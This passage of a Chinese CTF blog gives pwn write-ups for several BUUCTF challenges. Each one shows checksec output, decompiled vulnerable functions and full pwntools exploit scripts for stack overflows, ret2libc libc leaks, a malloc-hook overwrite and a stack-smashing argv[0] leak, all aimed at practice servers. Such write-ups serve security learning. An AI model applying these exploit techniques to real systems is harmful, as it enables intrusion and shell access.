class="comment">#gdb.attach(p)</span></span><br><span class="line">	add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">	add(<span class="number">0x68</span>)<span class="comment">#6 in malloc hook</span></span><br><span class="line">	edit(<span class="number">6</span>,<span class="number">27</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc))</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	add(<span class="number">0x10</span>)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rip"><a class="markdownIt-Anchor" href="#rip"></a> rip</h2>
<h3 id="1checksec-64"><a class="markdownIt-Anchor" href="#1checksec-64"></a> 1.checksec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-63"><a class="markdownIt-Anchor" href="#2ida-63"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+1h] [rbp-Fh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(&amp;s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>string</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000000004002A8	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:00000000004003B9	0000000A	C	libc.so.6</span><br><span class="line">LOAD:00000000004003C3	00000005	C	gets</span><br><span class="line">LOAD:00000000004003C8	00000005	C	puts</span><br><span class="line">LOAD:00000000004003CD	00000007	C	system</span><br><span class="line">LOAD:00000000004003D4	00000012	C	__libc_start_main</span><br><span class="line">LOAD:00000000004003E6	0000000C	C	GLIBC_2.2.5</span><br><span class="line">LOAD:00000000004003F2	0000000F	C	__gmon_start__</span><br><span class="line">.rodata:0000000000402004	0000000D	C	please input</span><br><span class="line">.rodata:0000000000402011	0000000A	C	ok,<span class="built_in">bye</span>!!!</span><br><span class="line">.rodata:000000000040201B	00000008	C	/bin/sh</span><br><span class="line">.eh_frame:00000000004020DF	00000006	C	;*3$\&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gets函数漏洞，有/bin/sh</p>
</blockquote>
<h3 id="3exp-49"><a class="markdownIt-Anchor" href="#3exp-49"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27035</span>)</span><br><span class="line">binsh_addr = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf</span> + p64(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="warmup_csaw_2016"><a class="markdownIt-Anchor" href="#warmup_csaw_2016"></a> warmup_csaw_2016</h2>
<h3 id="1checksec-65"><a class="markdownIt-Anchor" href="#1checksec-65"></a> 1.checksec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-64"><a class="markdownIt-Anchor" href="#2ida-64"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, &amp;s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;v5, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>string</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:0000000000400361	0000000A	C	libc.so.6</span><br><span class="line">LOAD:000000000040036B	00000005	C	gets</span><br><span class="line">LOAD:0000000000400370	00000008	C	sprintf</span><br><span class="line">LOAD:0000000000400378	00000007	C	system</span><br><span class="line">LOAD:000000000040037F	00000012	C	__libc_start_main</span><br><span class="line">LOAD:0000000000400391	00000006	C	write</span><br><span class="line">LOAD:0000000000400397	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:00000000004003A6	0000000C	C	GLIBC_2.2.5</span><br><span class="line">.rodata:0000000000400734	0000000D	C	<span class="built_in">cat</span> flag.txt</span><br><span class="line">.rodata:0000000000400741	0000000B	C	-Warm Up-\n</span><br><span class="line">.rodata:000000000040074C	00000005	C	WOW:</span><br><span class="line">.eh_frame:00000000004007FF	00000006	C	;*3$\&quot;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>gets溢出，system函数和cat flag字符串</p>
</blockquote>
<h3 id="3exp-50"><a class="markdownIt-Anchor" href="#3exp-50"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28792</span>)</span><br><span class="line"></span><br><span class="line">cat_flag = <span class="number">0x40060d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(cat_flag)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,payload)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wdb2018_guess"><a class="markdownIt-Anchor" href="#wdb2018_guess"></a> wdb2018_guess</h2>
<p>一道思路清奇的题</p>
<h3 id="checksec-2"><a class="markdownIt-Anchor" href="#checksec-2"></a> checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="反汇编"><a class="markdownIt-Anchor" href="#反汇编"></a> 反汇编</h3>
<p><img src="https://s1.ax1x.com/2020/09/10/wJT5o6.png" alt="IDA.png" /></p>
<p>可以看出</p>
<ul>
<li>**1.**flag文件被读取到了栈上面</li>
<li>**2.**主程序创建(<code>fork</code>)了三个线程</li>
<li>**3.**在这个线程里面，程序将我们的输入和站上面的flag进行比较</li>
<li>**4.**我们输入的时候调用了<code>gets</code>，导致栈溢出</li>
</ul>
<h3 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> GDB调试</h3>
<ul>
<li><strong>1.</strong> 输入后，在<code>strcmp</code>断点</li>
</ul>
<p><img src="https://s1.ax1x.com/2020/09/13/wwH30U.png" alt="gdb-1.png" /></p>
<p>我们溢出0x128就可以覆盖 _libc_arg[0] 的值，从而泄露数据</p>
<ul>
<li>
<p><strong>2.</strong> 找到flag的内存位置</p>
<p>这个我们可以从环境变量入手，找到_libc_environ，然后再根据相对偏移找到flag在栈上的地址</p>
</li>
</ul>
<h3 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h3>
<p>程序开启了canary保护，这里有个之前我忽略的点 <strong>canary的检查报错</strong></p>
<p>源码如下</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序输出的时候使用了 <strong>__libc_argv[0]</strong> 来打印程序的名称，所以就可以从这里泄露一些信息</p>
<p>这里拓展一下</p>
<p><strong>argc</strong>：命令的条数</p>
<p><strong>argv[]</strong>：输入的每条命令</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; argc; ++i)</span><br><span class="line">		cout&lt;&lt;argv[i]&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<p><img src="https://s1.ax1x.com/2020/09/13/wwL7ND.png" alt="arg-1.png" /></p>
<p>那么argv[0]=程序的名称(也是第0条指令)</p>
<p><strong>_libc_environ</strong></p>
<p>在libc中保存了一个函数叫_environ，存的是当前进程的环境变量</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chennbnbnb/article/details/104035261">如何从libc地址得到栈地址</a>这里面就详细写了这个函数</p>
<p><img src="https://s1.ax1x.com/2020/09/13/wwXps1.png" alt="arg-2.png" /></p>
<p><strong>攻击步骤</strong></p>
<ul>
<li><strong>1.</strong> 泄露libc</li>
<li><strong>2.</strong> 泄露_libc_arg的表头 environ，从而找到flag在站上面的地址</li>
<li><strong>3.</strong> 覆盖 **libc_arg[0]**为flag在栈上面的地址，最后通过 stack_smashing 泄露出flag</li>
</ul>
<h3 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">name = <span class="string">&quot;guess&quot;</span></span><br><span class="line">elf = ELF(name)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">sh = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">ip,port,debug,mode</span>):</span><br><span class="line">	<span class="keyword">global</span> sh</span><br><span class="line">	<span class="keyword">if</span> debug==<span class="number">0</span>:</span><br><span class="line">		context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> mode==<span class="number">0</span>:</span><br><span class="line">		sh = process(name)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x128</span></span><br><span class="line">	payload += p64(elf.got[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">	</span><br><span class="line">	sh.recvuntil(<span class="string">&#x27;stack smashing detected ***: &#x27;</span>)</span><br><span class="line">	libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">	system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">	environ = libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">	info(<span class="string">&quot;libc base -&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	info(<span class="string">&quot;libc_system -&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">	info(<span class="string">&quot;__libc_environ -&gt; &quot;</span>+<span class="built_in">hex</span>(environ))</span><br><span class="line"></span><br><span class="line">	payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x128</span></span><br><span class="line">	payload += p64(environ)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">	en_list = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	info(<span class="string">&quot;environ -&gt; &quot;</span>+<span class="built_in">hex</span>(en_list))</span><br><span class="line"></span><br><span class="line">	payload=<span class="string">&quot;A&quot;</span>*<span class="number">0x128</span></span><br><span class="line">	payload += p64(en_list-<span class="number">0x168</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;Please type your guessing flag\n&quot;</span>,payload)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">	<span class="built_in">print</span> sh.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;26263&quot;</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h2 id="xdctf2015_pwn200"><a class="markdownIt-Anchor" href="#xdctf2015_pwn200"></a> xdctf2015_pwn200</h2>
<h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bof&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./bof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">27377</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(write_plt)+p32(main)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,leak_addr)</span><br><span class="line">base = leak_addr-libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base=&gt;%x&quot;</span>,base)</span><br><span class="line">log.success(<span class="string">&quot;system addr=&gt;%x&quot;</span>,sys_addr)</span><br><span class="line">log.success(<span class="string">&quot;binsh=&gt;%x&quot;</span>,binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(sys_addr)+p32(main)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="铁人三项第五赛区_2018_rop"><a class="markdownIt-Anchor" href="#铁人三项第五赛区_2018_rop"></a> 铁人三项(第五赛区)_2018_rop</h2>
<h3 id="1checksec-66"><a class="markdownIt-Anchor" href="#1checksec-66"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-65"><a class="markdownIt-Anchor" href="#2ida-65"></a> 2.IDA</h3>
<p><strong>vulnerable_function</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+10h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>溢出+libc leak</p>
</blockquote>
<h3 id="3exp-51"><a class="markdownIt-Anchor" href="#3exp-51"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">26402</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(write_plt)+p32(main_addr)</span><br><span class="line">payload +=  p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = leak_addr - libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;libc base=&gt;%x&quot;</span>,libc_base)</span><br><span class="line">log.info(<span class="string">&quot;system addr=&gt;%x&quot;</span>,sys_addr)</span><br><span class="line">log.info(<span class="string">&quot;/bin/sh addr=&gt;%x&quot;</span>,binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(sys_addr)+p32(main_addr)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2021/03/30/Maleware/">prev_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>